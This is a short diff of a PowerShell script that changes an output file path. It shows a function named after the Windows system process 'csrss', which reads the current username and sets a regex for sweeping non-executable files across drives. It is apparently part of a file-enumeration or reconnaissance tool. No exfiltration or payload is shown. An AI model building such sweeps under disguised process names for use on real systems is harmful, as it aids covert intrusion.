@@ -36,7 +36,7 @@ function csrss {
 
     $Username = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -split '\\')[1]
 
-    $FilePath1 = "C:\res1"
+    $FilePath1 = "C:\res1.txt"
     $FilePath2 = "C:\res2.txt"
 
     $RegexModifiedExtension = "(?!.*(\.exe|\.dll|\\|\.dll\..*\.config|\.exe\.config)$)^[A-Z]:\\.*\..*"
